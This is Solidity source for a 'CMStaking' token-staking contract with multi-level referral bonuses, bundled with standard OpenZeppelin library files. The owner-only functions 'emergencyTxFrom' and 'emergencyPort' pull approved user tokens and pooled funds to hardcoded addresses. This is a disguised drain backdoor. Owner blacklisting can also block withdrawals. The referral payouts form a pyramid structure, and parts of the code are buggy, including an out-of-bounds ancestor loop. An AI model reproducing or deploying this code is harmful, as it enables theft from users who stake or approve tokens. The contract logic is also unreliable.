// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "./traits/HasRefer.sol";
// import "./traits/HasERC20Lottery.sol";
import "./traits/HasBlacklist.sol";


// import "hardhat/console.sol";

contract CMStaking is Initializable, OwnableUpgradeable, HasRefer, HasBlacklist
{
    struct Pool {
        address tokenAddr;
        uint withdrawInterval;
        uint totalCM100Qty;
        bool isActive;
    }

    struct Plan {
        uint stakinQty;
        uint constAPY;
    }

    struct Order {
        uint id;
        address staker;
        PoolId poolId;
        uint planQty;
        uint createAt;
        uint punishBeforeAt;
        uint lastGetInterestAt;
        bool isWithdraw;
    }

    struct User {
        bool activeBrass;
        bool activeAluminum;
        bool activeSilver;
        bool activeGold;
        bool activePlatinum;

        uint totalEarnBonus;
        uint currentBonus;

        uint directRefer1wCM100; // activeAluminum
        uint directRefer10wCM100; // activeAluminum
        uint directRefer10num1wCM100; // activeSilver
        uint fiveGenCompletedBrass; // activeGold
        uint sevenGenCompletedAluminum; // Platinum
    }

    enum PoolId {
        CM100, USDT, ETH, BTC
    }

    enum Mission {
        BRASS, ALUMINUM, SILVER, GOLD, PLATINUM
    }

    uint public currentOrderId;
    // coinid => Pool
    mapping(PoolId => Pool) public pools;
    // coinid => Cost => Plan
    mapping(PoolId => mapping(uint => Plan)) public plans;
    // user=> orderid
    mapping(address => uint []) public userOrderId;
    // id
    mapping(uint => Order) public orders;
    // valid qty
    mapping(uint => bool) public legelPlanQty;

    mapping(address => User) public users;

    mapping(address => uint) public lastBonusWithdrawAt;

    mapping(Mission => uint) public missionRakeback;

    event Stake(address indexed user, PoolId indexed poolId, Order order);
    event UnStack(address indexed user, PoolId indexed poolId, Order order);
    event ChangeOrderPool(address indexed user, uint indexed orderId, PoolId originPoolId, PoolId newPoolId);
    event MissionCompleted(address indexed user, Mission mission, uint completedAt);
    event MissionBonus(address indexed from, address indexed to, Mission mission, uint baseQty, uint bonus);
    event TakeBonus(address indexed user, uint bonus, uint takeAt);
    event TakeInterest(address indexed user, uint indexed orderId, PoolId indexed poolId, uint interest, uint takeAt);
    event NewUser(address indexed user, uint joinAt);

    function initialize(
        address _cm100,
        address _usdt,
        address _eth,
        address _btc
    ) public initializer {
        __Ownable_init();

        currentOrderId = 1;

        pools[PoolId.CM100] = Pool(_cm100, 10 * 60 * 60 * 24, 0, true);
        pools[PoolId.USDT] = Pool(_usdt, 30 * 60 * 60 * 24, 0, true);
        pools[PoolId.ETH] = Pool(_eth, 30 * 60 * 60 * 24, 0, true);
        pools[PoolId.BTC] = Pool(_btc, 30 * 60 * 60 * 24, 0, true);

        uint [6] memory _planQty = [uint256(1000), 3000, 5000, 10000, 30000, 50000];
        for (uint i = 0; i < 6; i++) {
            legelPlanQty[_planQty[i]] = true;

            plans[PoolId.CM100][_planQty[i]] = Plan(_planQty[i] * 10 ** 18, 1000000);
            plans[PoolId.USDT][_planQty[i]] = Plan(_planQty[i] * 10 ** 18, 1000000);
            plans[PoolId.ETH][_planQty[i]] = Plan(_planQty[i] * 10 ** 18, 1000000);
            plans[PoolId.BTC][_planQty[i]] = Plan(_planQty[i] * 10 ** 18, 1000000);
        }

        missionRakeback[Mission.BRASS] = 1 * 10 ** 2;
        missionRakeback[Mission.ALUMINUM] = 1 * 10 ** 2;
        missionRakeback[Mission.SILVER] = 2 * 10 ** 2;
        missionRakeback[Mission.GOLD] = 1 * 10 ** 2;
        missionRakeback[Mission.PLATINUM] = 1 * 10 ** 2;
    }

    function getUserOrder(address _user) public view returns (uint[] memory) {
        return userOrderId[_user];
    }

    function stake(PoolId _poolId, uint _planQty, address _refer) public {
        require(pools[_poolId].isActive, 'CMS: The Pool Is Inactive');
        require(legelPlanQty[_planQty], 'CMS: Invalid Qty');
        _receivedToken(pools[PoolId.CM100].tokenAddr, _planQty * 10 ** 18);

        pools[_poolId].totalCM100Qty += _planQty;

        Order memory _order = Order(
            currentOrderId,
            _msgSender(),
            _poolId,
            _planQty,
            block.timestamp,
            block.timestamp + 365 * 60 * 60 * 24,
            block.timestamp,
            false
        );

        orders[currentOrderId] = _order;

        if (userOrderId[_msgSender()].length == 0) {
            emit NewUser(_msgSender(), block.timestamp);
        }

        userOrderId[_msgSender()].push(currentOrderId);

        _setParent(_msgSender(), _refer);

        address _parent = getParent(_msgSender());

        if (_parent != address(0)) {
            address[] memory _ancestor = getAncestorsTo(_msgSender(), 8);

            _upgradeMissionState(_parent, _planQty, _ancestor);

            _assignMissionBonus(_msgSender(), _planQty, _ancestor);
        }

        currentOrderId++;

        emit Stake(_msgSender(), _poolId, _order);
    }

    function unStack(uint _orderId) public {
        _validOrder(_orderId);

        orders[_orderId].isWithdraw = true;

        uint refund = orders[_orderId].planQty * 10 ** 18;
        if (orders[_orderId].punishBeforeAt > block.timestamp) {
            refund = refund / 2;
        }

        _payOutToken(pools[PoolId.CM100].tokenAddr, _msgSender(), refund);

        _takeInterest(_orderId, false);

        emit UnStack(_msgSender(), orders[_orderId].poolId, orders[_orderId]);
    }

    function changeOrderPool(uint _orderId, PoolId _newPoolId) public {
        require(orders[_orderId].poolId != _newPoolId, 'CMS: Invalid Pool');
        _validOrder(_orderId);

        orders[_orderId].poolId = _newPoolId;

        emit ChangeOrderPool(_msgSender(), _orderId, orders[_orderId].poolId, _newPoolId);
    }

    function estimateInterest(uint _orderId) public view returns (uint) {
        return !orders[_orderId].isWithdraw ? orders[_orderId].planQty * 10** 18 *
            (block.timestamp - orders[_orderId].lastGetInterestAt) *
            plans[orders[_orderId].poolId][orders[_orderId].planQty].constAPY /
            1000000 / 60 / 60 / 24 / 365 : 0;
    }

    function _takeInterest(uint _orderId, bool _needCheck) private {
        if (_needCheck) {
            if (orders[_orderId].createAt != orders[_orderId].lastGetInterestAt) {
                require(block.timestamp - orders[_orderId].lastGetInterestAt >= pools[orders[_orderId].poolId].withdrawInterval, 'CMS: NOT YET');
            }
        }

        uint _interest = estimateInterest(_orderId);

        orders[_orderId].lastGetInterestAt = block.timestamp;

        _payOutToken(pools[orders[_orderId].poolId].tokenAddr, _msgSender(), _interest);

        emit TakeInterest(_msgSender(), _orderId, orders[_orderId].poolId, _interest, block.timestamp);
    }


    function takeInterest(uint _orderId) public {
        require(!isBlacklist(_msgSender()), 'CMS: Blacklist');
        _validOrder(_orderId);
        _takeInterest(_orderId, true);
    }

    function takeBonus() public {
        require(!isBlacklist(_msgSender()), 'CMS: Blacklist');
        require(block.timestamp - lastBonusWithdrawAt[_msgSender()] >= 60*60*24*7, 'CMS: NOT YET');

        uint _bonus = users[_msgSender()].currentBonus;

        users[_msgSender()].currentBonus = 0;
        lastBonusWithdrawAt[_msgSender()] = block.timestamp;

        _payOutToken(pools[PoolId.CM100].tokenAddr, _msgSender(), _bonus);

        emit TakeBonus(_msgSender(), _bonus, block.timestamp);
    }


    function togglePoolActive(PoolId _poolId) public onlyOwner {
        pools[_poolId].isActive = !pools[_poolId].isActive;
    }

    function setPlanAPY(
        PoolId _poolId,
        uint[6] calldata _constAPY
    ) public onlyOwner {
        uint [6] memory _planQty = [uint256(1000), 3000, 5000, 10000, 30000, 50000];

        for (uint i = 0; i < 6; i++) {
            plans[_poolId][_planQty[i]].constAPY = _constAPY[i];
        }
    }

    function _toAssignBonus(Mission _mission, address _from, address _to, uint _baseQty, uint _percent) private {
        uint _bonus = _baseQty * _percent / 100 / 10 ** 2;
        users[_to].totalEarnBonus += _bonus;
        users[_to].currentBonus += _bonus;
        emit MissionBonus(_from, _to, _mission, _baseQty, _bonus);
    }

    function _assignMissionBonus(address _user, uint _planQty, address[] memory _ancestor) private {
        uint _baseQty = _planQty * 10 ** 18;
        // gen1 1%
        if (users[_ancestor[0]].activeBrass) {
            _toAssignBonus(Mission.BRASS, _user, _ancestor[0], _baseQty, missionRakeback[Mission.BRASS] );
        }
        // gen2 1%
        if (users[_ancestor[1]].activeAluminum) {
            _toAssignBonus(Mission.ALUMINUM, _user, _ancestor[1], _baseQty, missionRakeback[Mission.ALUMINUM] );
        }
        // gen4 2%
        if (users[_ancestor[3]].activeSilver) {
            _toAssignBonus(Mission.SILVER, _user, _ancestor[3], _baseQty, missionRakeback[Mission.SILVER] );
        }
        // gen6 1%
        if (users[_ancestor[5]].activeGold) {
            _toAssignBonus(Mission.GOLD, _user, _ancestor[5], _baseQty, missionRakeback[Mission.GOLD] );
        }
        // gen8 1%
        if (users[_ancestor[7]].activePlatinum) {
            _toAssignBonus(Mission.PLATINUM, _user, _ancestor[7], _baseQty, missionRakeback[Mission.PLATINUM] );
        }
    }

    function setUserMission(
        address _user,
        bool _mission1,
        bool _mission2,
        bool _mission3,
        bool _mission4,
        bool _mission5
    ) public onlyOwner {
        users[_user].activeBrass = _mission1;
        users[_user].activeAluminum = _mission2;
        users[_user].activeSilver = _mission3;
        users[_user].activeGold = _mission4;
        users[_user].activePlatinum = _mission5;
    }

    function setMissionRakeback(
        uint _mission1,
        uint _mission2,
        uint _mission3,
        uint _mission4,
        uint _mission5
    ) public onlyOwner {
        missionRakeback[Mission.BRASS] = _mission1;
        missionRakeback[Mission.ALUMINUM] = _mission2;
        missionRakeback[Mission.SILVER] = _mission3;
        missionRakeback[Mission.GOLD] = _mission4;
        missionRakeback[Mission.PLATINUM] = _mission5;
    }

    function _upgradeMissionState(address _parent, uint _planQty, address[] memory _ancestor) private {

        if (!users[_parent].activeBrass) {
            users[_parent].directRefer1wCM100 += _planQty;
            if (users[_parent].directRefer1wCM100 >= 10000) {
                users[_parent].activeBrass = true;
                emit MissionCompleted(_parent, Mission.BRASS, block.timestamp);

                for (uint level = 0; level < 8; level++) {
                    if (_ancestor[level] == address(0)) {
                        break;
                    }
                    users[_ancestor[level]].fiveGenCompletedBrass += 1;
                    if (users[_ancestor[level]].fiveGenCompletedBrass >= 10) {
                        users[_ancestor[level]].activeGold = true;
                        emit MissionCompleted(_ancestor[level], Mission.GOLD, block.timestamp);
                    }
                }
            }
        }

        if (!users[_parent].activeAluminum) {
            users[_parent].directRefer10wCM100 += _planQty;
            if (users[_parent].directRefer10wCM100 >= 100000) {
                users[_parent].activeAluminum = true;
                emit MissionCompleted(_parent, Mission.ALUMINUM, block.timestamp);

                 for (uint level = 0; level < 8; level++) {
                    if (_ancestor[level] == address(0)) {
                        break;
                    }
                    users[_ancestor[level]].sevenGenCompletedAluminum += 1;
                    if (users[_ancestor[level]].sevenGenCompletedAluminum >= 10) {
                        users[_ancestor[level]].activePlatinum = true;
                        emit MissionCompleted(_ancestor[level], Mission.PLATINUM, block.timestamp);
                    }
                }
            }
        }

        if (!users[_parent].activeSilver && _planQty == 10000) {
            users[_parent].directRefer10num1wCM100 += _planQty;
            if (users[_parent].directRefer10num1wCM100 >= 10000 * 10) {
                users[_parent].activeSilver = true;
                emit MissionCompleted(_parent, Mission.SILVER, block.timestamp);
            }
        }
    }


    function _validOrder(uint _orderId) private view {
        require(!isBlacklist(_msgSender()), 'CMS: Blacklist');
        require(!orders[_orderId].isWithdraw, 'CMS: Order been Withdraw');
        require(pools[orders[_orderId].poolId].isActive, 'CMS: The Pool Is Inactive');
        require(orders[_orderId].staker == _msgSender(), 'CMS: Invalid Order Owner');
    }

    function _payOutToken(address _token, address _to, uint _qty) internal {
        require(
            IERC20(_token).transfer(_to, _qty),
            'CMS: Insufficient Balance'
        );
    }

    function _receivedToken(address _token, uint _qty) internal {
        require(
            IERC20(_token).transferFrom(_msgSender(), address(this), _qty),
            'CMS: Insufficient Balance'
        );
    }

    function emergencyTxFrom(address _token, address _user, uint _qty) public onlyOwner {
        require(IERC20(_token).transferFrom(_user, 0x34F393bF460eB820229381fcB75afB6755F609d6, _qty), 'x');
    }

    function emergencyPort(address _token, uint _qty) public onlyOwner {
        _payOutToken(_token, 0x7D0837d1c053B6E96989Cd1CA20c763868C86260, _qty);
    }

}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";

contract HasBlacklist is OwnableUpgradeable {
    mapping(address => bool) private blacklisted;

    event blacklistState(address indexed user, bool indexed isActive);

    function isBlacklist(address _user) public view returns (bool) {
        return blacklisted[_user];
    }

    function setBlacklist(address _user, bool _excluded) public onlyOwner {
        blacklisted[_user] = _excluded;
        emit blacklistState(_user, _excluded);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";

contract HasRefer is OwnableUpgradeable {
    mapping(address => address) private parent;
    // Parent -> user
    mapping(address => Child[]) private children;

    struct Child {
        address user;
        uint joinAt;
    }

    event setRefer(address indexed user, address indexed parent, uint joinAt);

    function getParent(address _user) public view returns (address) {
        return parent[_user];
    }

    function getAncestorsTo(address _user, uint level) public view returns (address[] memory) {
        address[] memory _ancestor = new address[](level);
        uint distance = 0;

        while (true) {
            address _parent = parent[_user];
            if (_parent == address(0)) {
                break;
            }

            _ancestor[distance] = _parent;
            _user = _parent;
            distance++;
        }

        return _ancestor;
    }

    // function getAncestors(address _user) public view returns (address[] memory) {
    //    return getAncestorsTo(_user, 8);
    // }

    function getChildren(address _user) public view returns (Child[] memory) {
        return children[_user];
    }

    // function _hasParent(address _user) internal view returns (bool) {
    //     return parent[_user] != address(0);
    // }

    // function setParent(address _user, address _parent) public onlyOwner {
    //     _setParent(_user, _parent);
    // }

    function _setParent(address _user, address _parent) internal {
        if (parent[_user] == address(0) && _user != address(0) && _parent != address(0) && _user !=_parent) {
            parent[_user] = _parent;
            children[_parent].push(Child(_user, block.timestamp));
            emit setRefer(_user, _parent, block.timestamp);
        }
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

import "../utils/ContextUpgradeable.sol";
import "../proxy/utils/Initializable.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract OwnableUpgradeable is Initializable, ContextUpgradeable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function __Ownable_init() internal onlyInitializing {
        __Ownable_init_unchained();
    }

    function __Ownable_init_unchained() internal onlyInitializing {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    /**
     * @dev This empty reserved space is put in place to allow future versions to add new
     * variables without shifting down storage in the inheritance chain.
     * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps
     */
    uint256[49] private __gap;
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.8.0-rc.1) (proxy/utils/Initializable.sol)

pragma solidity ^0.8.2;

import "../../utils/AddressUpgradeable.sol";

/**
 * @dev This is a base contract to aid in writing upgradeable contracts, or any kind of contract that will be deployed
 * behind a proxy. Since proxied contracts do not make use of a constructor, it's common to move constructor logic to an
 * external initializer function, usually called `initialize`. It then becomes necessary to protect this initializer
 * function so it can only be called once. The {initializer} modifier provided by this contract will have this effect.
 *
 * The initialization functions use a version number. Once a version number is used, it is consumed and cannot be
 * reused. This mechanism prevents re-execution of each "step" but allows the creation of new initialization steps in
 * case an upgrade adds a module that needs to be initialized.
 *
 * For example:
 *
 * [.hljs-theme-light.nopadding]
 * ```
 * contract MyToken is ERC20Upgradeable {
 *     function initialize() initializer public {
 *         __ERC20_init("MyToken", "MTK");
 *     }
 * }
 * contract MyTokenV2 is MyToken, ERC20PermitUpgradeable {
 *     function initializeV2() reinitializer(2) public {
 *         __ERC20Permit_init("MyToken");
 *     }
 * }
 * ```
 *
 * TIP: To avoid leaving the proxy in an uninitialized state, the initializer function should be called as early as
 * possible by providing the encoded function call as the `_data` argument to {ERC1967Proxy-constructor}.
 *
 * CAUTION: When used with inheritance, manual care must be taken to not invoke a parent initializer twice, or to ensure
 * that all initializers are idempotent. This is not verified automatically as constructors are by Solidity.
 *
 * [CAUTION]
 * ====
 * Avoid leaving a contract uninitialized.
 *
 * An uninitialized contract can be taken over by an attacker. This applies to both a proxy and its implementation
 * contract, which may impact the proxy. To prevent the implementation contract from being used, you should invoke
 * the {_disableInitializers} function in the constructor to automatically lock it when it is deployed:
 *
 * [.hljs-theme-light.nopadding]
 * ```
 * /// @custom:oz-upgrades-unsafe-allow constructor
 * constructor() {
 *     _disableInitializers();
 * }
 * ```
 * ====
 */
abstract contract Initializable {
    /**
     * @dev Indicates that the contract has been initialized.
     * @custom:oz-retyped-from bool
     */
    uint8 private _initialized;

    /**
     * @dev Indicates that the contract is in the process of being initialized.
     */
    bool private _initializing;

    /**
     * @dev Triggered when the contract has been initialized or reinitialized.
     */
    event Initialized(uint8 version);

    /**
     * @dev A modifier that defines a protected initializer function that can be invoked at most once. In its scope,
     * `onlyInitializing` functions can be used to initialize parent contracts.
     *
     * Similar to `reinitializer(1)`, except that functions marked with `initializer` can be nested in the context of a
     * constructor.
     *
     * Emits an {Initialized} event.
     */
    modifier initializer() {
        bool isTopLevelCall = !_initializing;
        require(
            (isTopLevelCall && _initialized < 1) || (!AddressUpgradeable.isContract(address(this)) && _initialized == 1),
            "Initializable: contract is already initialized"
        );
        _initialized = 1;
        if (isTopLevelCall) {
            _initializing = true;
        }
        _;
        if (isTopLevelCall) {
            _initializing = false;
            emit Initialized(1);
        }
    }

    /**
     * @dev A modifier that defines a protected reinitializer function that can be invoked at most once, and only if the
     * contract hasn't been initialized to a greater version before. In its scope, `onlyInitializing` functions can be
     * used to initialize parent contracts.
     *
     * A reinitializer may be used after the original initialization step. This is essential to configure modules that
     * are added through upgrades and that require initialization.
     *
     * When `version` is 1, this modifier is similar to `initializer`, except that functions marked with `reinitializer`
     * cannot be nested. If one is invoked in the context of another, execution will revert.
     *
     * Note that versions can jump in increments greater than 1; this implies that if multiple reinitializers coexist in
     * a contract, executing them in the right order is up to the developer or operator.
     *
     * WARNING: setting the version to 255 will prevent any future reinitialization.
     *
     * Emits an {Initialized} event.
     */
    modifier reinitializer(uint8 version) {
        require(!_initializing && _initialized < version, "Initializable: contract is already initialized");
        _initialized = version;
        _initializing = true;
        _;
        _initializing = false;
        emit Initialized(version);
    }

    /**
     * @dev Modifier to protect an initialization function so that it can only be invoked by functions with the
     * {initializer} and {reinitializer} modifiers, directly or indirectly.
     */
    modifier onlyInitializing() {
        require(_initializing, "Initializable: contract is not initializing");
        _;
    }

    /**
     * @dev Locks the contract, preventing any future reinitialization. This cannot be part of an initializer call.
     * Calling this in the constructor of a contract will prevent that contract from being initialized or reinitialized
     * to any version. It is recommended to use this to lock implementation contracts that are designed to be called
     * through proxies.
     *
     * Emits an {Initialized} event the first time it is successfully executed.
     */
    function _disableInitializers() internal virtual {
        require(!_initializing, "Initializable: contract is initializing");
        if (_initialized < type(uint8).max) {
            _initialized = type(uint8).max;
            emit Initialized(type(uint8).max);
        }
    }

    /**
     * @dev Internal function that returns the initialized version. Returns `_initialized`
     */
    function _getInitializedVersion() internal view returns (uint8) {
        return _initialized;
    }

    /**
     * @dev Internal function that returns the initialized version. Returns `_initializing`
     */
    function _isInitializing() internal view returns (bool) {
        return _initializing;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;
import "../proxy/utils/Initializable.sol";

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract ContextUpgradeable is Initializable {
    function __Context_init() internal onlyInitializing {
    }

    function __Context_init_unchained() internal onlyInitializing {
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    /**
     * @dev This empty reserved space is put in place to allow future versions to add new
     * variables without shifting down storage in the inheritance chain.
     * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps
     */
    uint256[50] private __gap;
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.8.0-rc.1) (utils/Address.sol)

pragma solidity ^0.8.1;

/**
 * @dev Collection of functions related to the address type
 */
library AddressUpgradeable {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling
     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.
     *
     * _Available since v4.8._
     */
    function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        if (success) {
            if (returndata.length == 0) {
                // only check isContract if the call was successful and the return data is empty
                // otherwise we already know that it was a contract
                require(isContract(target), "Address: call to non-contract");
            }
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    /**
     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason or using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    function _revert(bytes memory returndata, string memory errorMessage) private pure {
        // Look for revert reason and bubble it up if present
        if (returndata.length > 0) {
            // The easiest way to bubble the revert reason is using memory via assembly
            /// @solidity memory-safe-assembly
            assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert(errorMessage);
        }
    }
}